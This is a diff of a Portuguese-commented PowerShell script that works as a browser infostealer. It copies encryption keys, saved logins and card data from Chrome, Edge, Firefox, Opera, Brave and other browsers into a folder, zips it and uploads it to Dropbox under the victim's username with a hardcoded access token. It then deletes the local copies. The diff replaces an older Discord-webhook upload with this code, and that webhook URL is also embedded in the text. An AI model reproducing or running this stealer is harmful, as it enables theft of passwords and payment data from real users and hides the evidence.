@@ -1,20 +1,39 @@
 <#
-    .DESCRIPTION
+        .DESCRIPTION
 
-    Os arquivos copiados devem ser utilizados
-    no app HackBrowser para realizar a descriptografia.
+        Os arquivos copiados devem ser utilizados
+        no app HackBrowserData para realizar a descriptografia.
 
-    https://github.com/moonD4rk/HackBrowserData
+        https://github.com/moonD4rk/HackBrowserData
 #>
 
 $base_path = $env:USERPROFILE + "\AppData"
-$webhook     = "https://discord.com/api/webhooks/1075986457958813806/kZtzOInNHBQxnRnOS0aoavmnN89EjmHVhJn_rlB1KOCPzJ_GqL0GG-N-3bgc3jCXG2cR"
+
+$edgeProfilePath        = $base_path + "\Local\Microsoft\Edge\User Data\Default\"
+$chromeUserDataPath     = $base_path + "\Local\Google\Chrome\User Data\Default\"
+$yandexProfilePath      = $base_path + "\Local\Yandex\YandexBrowser\User Data\Default\"
+$firefoxProfilePath     = $base_path + "\Roaming\Mozilla\Firefox\Profiles\"
+$chromeBetaUserDataPath = $base_path + "\Local\Google\Chrome Beta\User Data\Default\"
+$chromiumUserDataPath   = $base_path + "\Local\Chromium\User Data\Default\"
+$braveProfilePath       = $base_path + "\Local\BraveSoftware\Brave-Browser\User Data\Default\"
+$speed360ProfilePath    = $base_path + "\Local\360chrome\Chrome\User Data\Default\"
+$qqBrowserProfilePath   = $base_path + "\Local\Tencent\QQBrowser\User Data\Default\"
+$operaProfilePath       = $base_path + "\Roaming\Opera Software\Opera Stable\"
+$operaGXProfilePath     = $base_path + "\Roaming\Opera Software\Opera GX Stable\"
+$vivaldiProfilePath     = $base_path + "\Local\Vivaldi\User Data\Default\"
+$coccocProfilePath      = $base_path + "\Local\CocCoc\Browser\User Data\Default\"
+
+if (Test-Path -Path "Dump") {
+    Remove-Item "Dump" -Recurse 
+}
+
+if (Test-Path "Dump.zip") {
+    Remove-Item "Dump.zip"
+}
 
 New-Item "Dump" -itemType Directory
 
 Function DumpEdge{
-    
-    $edgeProfilePath = $base_path + "\Local\Microsoft\Edge\User Data\Default\"
     
     if (Test-Path -Path $edgeProfilePath) {
         $fileChromiumKey          = $edgeProfilePath + "Local State"
@@ -45,8 +64,6 @@ Function DumpEdge{
 
 Function DumpChrome{
     
-    $chromeUserDataPath = $base_path + "\Local\Google\Chrome\User Data\Default\"
-    
     if (Test-Path -Path $chromeUserDataPath) {
         $fileChromiumKey          = $chromeUserDataPath + "Local State"
         $fileChromiumCredit       = $chromeUserDataPath + "Web Data"
@@ -75,7 +92,6 @@ Function DumpChrome{
 }
 
 Function DumpYandex{
-    $yandexProfilePath = $base_path + "\Local\Yandex\YandexBrowser\User Data\Default\"
 
     if (Test-Path -Path $yandexProfilePath) {
 
@@ -92,9 +108,7 @@ Function DumpYandex{
 }
 
 Function DumpFirefox{
-    $firefoxProfilePath = $base_path + "\Roaming\Mozilla\Firefox\Profiles\"
-
-
+    
     if (Test-Path -Path $firefoxProfilePath) {
 
         New-Item "Dump\Firefox" -itemType Directory
@@ -125,8 +139,6 @@ Function DumpFirefox{
 
 Function DumpChromeBeta{
     
-    $chromeBetaUserDataPath = $base_path + "\Local\Google\Chrome Beta\User Data\Default\"
-    
     if (Test-Path -Path $chromeBetaUserDataPath) {
         $fileChromiumKey          = $chromeBetaUserDataPath + "Local State"
         $fileChromiumCredit       = $chromeBetaUserDataPath + "Web Data"
@@ -155,8 +167,6 @@ Function DumpChromeBeta{
 }
 
 Function DumpChromium{
-    
-    $chromiumUserDataPath = $base_path + "\Local\Chromium\User Data\Default\"
     
     if (Test-Path -Path $chromiumUserDataPath) {
         $fileChromiumKey          = $chromiumUserDataPath + "Local State"
@@ -187,8 +197,6 @@ Function DumpChromium{
 
 Function DumpBrave{
     
-    $braveProfilePath = $base_path + "\Local\BraveSoftware\Brave-Browser\User Data\Default\"
-    
     if (Test-Path -Path $braveProfilePath) {
         $fileChromiumKey          = $braveProfilePath + "Local State"
         $fileChromiumCredit       = $braveProfilePath + "Web Data"
@@ -217,8 +225,6 @@ Function DumpBrave{
 }
 
 Function DumpSpeed360{
-    
-    $speed360ProfilePath = $base_path + "\Local\360chrome\Chrome\User Data\Default\"
     
     if (Test-Path -Path $speed360ProfilePath) {
         $fileChromiumKey          = $speed360ProfilePath + "Local State"
@@ -249,8 +255,6 @@ Function DumpSpeed360{
 
 Function DumpQQBrowser{
     
-    $qqBrowserProfilePath = $base_path + "\Local\Tencent\QQBrowser\User Data\Default\"
-    
     if (Test-Path -Path $qqBrowserProfilePath) {
         $fileChromiumKey          = $qqBrowserProfilePath + "Local State"
         $fileChromiumCredit       = $qqBrowserProfilePath + "Web Data"
@@ -279,8 +283,6 @@ Function DumpQQBrowser{
 }
 
 Function DumpOpera{
-    
-    $operaProfilePath = $base_path + "\Roaming\Opera Software\Opera Stable\"
     
     if (Test-Path -Path $operaProfilePath) {
         $fileChromiumKey          = $operaProfilePath + "Local State"
@@ -311,8 +313,6 @@ Function DumpOpera{
 
 Function DumpOperaGX{
     
-    $operaGXProfilePath = $base_path + "\Roaming\Opera Software\Opera GX Stable\"
-    
     if (Test-Path -Path $operaGXProfilePath) {
         $fileChromiumKey          = $operaGXProfilePath + "Local State"
         $fileChromiumCredit       = $operaGXProfilePath + "Web Data"
@@ -342,8 +342,6 @@ Function DumpOperaGX{
 
 Function DumpVivaldi{
     
-    $vivaldiProfilePath = $base_path + "\Local\Vivaldi\User Data\Default\"
-    
     if (Test-Path -Path $vivaldiProfilePath) {
         $fileChromiumKey          = $vivaldiProfilePath + "Local State"
         $fileChromiumCredit       = $vivaldiProfilePath + "Web Data"
@@ -372,8 +370,6 @@ Function DumpVivaldi{
 }
 
 Function DumpCoccoc{
-    
-    $coccocProfilePath = $base_path + "\Local\CocCoc\Browser\User Data\Default\"
     
     if (Test-Path -Path $coccocProfilePath) {
         $fileChromiumKey          = $coccocProfilePath + "Local State"
@@ -416,32 +412,38 @@ DumpCoccoc
 DumpYandex
 DumpFirefox
 
+Compress-Archive -Path "Dump" -DestinationPath "Dump.zip"
+Remove-Item "Dump" -Recurse
+
 <#
 
-.DESCRIPTION
-TODO: Enviar os arquivos copiados para algum local remoto, como por
-exemplo: Email, FTP...
+        .DESCRIPTION
 
-Get-ChildItem -Path "Dump" |
-Foreach-Object {
+        Enviar os arquivos copiados para algum local remoto, como por
+        exemplo: Email, FTP... No código atual os arquivos são enviados para o DropBox.
 
-    Compress-Archive -Path "Dump\$($_)" -DestinationPath "$($_).zip"
-
-    # SEND DATA TO DISCORD
-    $fileBytes = [System.IO.File]::ReadAllBytes("$($_).zip");
-    $fileEnc = [System.Text.Encoding]::GetEncoding('UTF-8').GetString($fileBytes);
-    $boundary = [System.Guid]::NewGuid().ToString(); 
-    $LF = "`r`n";
-    $bodyLines = ( 
-        "--$boundary",
-        "Content-Disposition: form-data; name=`"file`"; filename=`"$($_).zip`";",
-        "Content-Type: application/octet-stream$LF",
-        $fileEnc,
-        "--$boundary--$LF" 
-    ) -join $LF
-
-    Invoke-RestMethod -Uri $webhook -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
-}
-
+        ATTENTION: This ACCESS_TOKEN is a TEST ACCOUNT, so there's no point in trying anything ;)
+        ATTENTION: This ACCESS_TOKEN is a TEST ACCOUNT, so there's no point in trying anything ;)
+        ATTENTION: This ACCESS_TOKEN is a TEST ACCOUNT, so there's no point in trying anything ;)
+        ATTENTION: This ACCESS_TOKEN is a TEST ACCOUNT, so there's no point in trying anything ;)
+        ATTENTION: This ACCESS_TOKEN is a TEST ACCOUNT, so there's no point in trying anything ;)
+        ATTENTION: This ACCESS_TOKEN is a TEST ACCOUNT, so there's no point in trying anything ;)
 #>
 
+$dumpfile = "Dump.zip"
+$DropboxTargetPath = "/dump_$($env:UserName).zip"
+$endpoint = "https://content.dropboxapi.com/2/files/upload"
+$access_token = "sl.BZfiR22lYe85ArVSd2f5rjZHT5p48we2g9Yr4ef_QXmS32v4cX-SqnwJcbQQ6TPjhHw3gBu3CGk3FCGC7S0fyK6D33NIG-nWrmHJMhVu206GRbf0MQp5XogoCx1lDEIANR5M5-E"
+
+$arg = '{ "path": "' + ${DropboxTargetPath} + '", "mode": "add", "autorename": true, "mute": false }'
+$authorization = "Bearer " + $access_token
+
+$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+$headers.Add("Authorization", ${authorization})
+$headers.Add("Dropbox-API-Arg", ${arg})
+$headers.Add("Content-Type", 'application/octet-stream')
+
+Invoke-RestMethod -Uri $endpoint -Method Post -InFile $dumpfile -Headers ${headers}
+
+
+Remove-Item "Dump.zip"
